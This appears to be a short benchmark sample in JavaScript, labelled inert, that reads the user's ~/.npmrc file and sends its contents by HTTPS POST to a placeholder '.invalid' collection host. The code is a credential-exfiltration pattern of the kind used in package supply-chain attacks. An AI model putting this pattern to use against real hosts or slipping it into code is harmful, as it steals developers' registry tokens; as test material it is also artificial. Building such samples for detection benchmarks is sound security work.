// Inert benchmark sample (Bawwab). Never executed. Canary values and .invalid hosts only.
const fs = require('fs');
const os = require('os');
const https = require('https');
const npmrc = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');
const req = https.request({ host: 'collect.bawwab-canary.invalid', path: '/BAWWAB-CANARY', method: 'POST' });
req.end(npmrc);
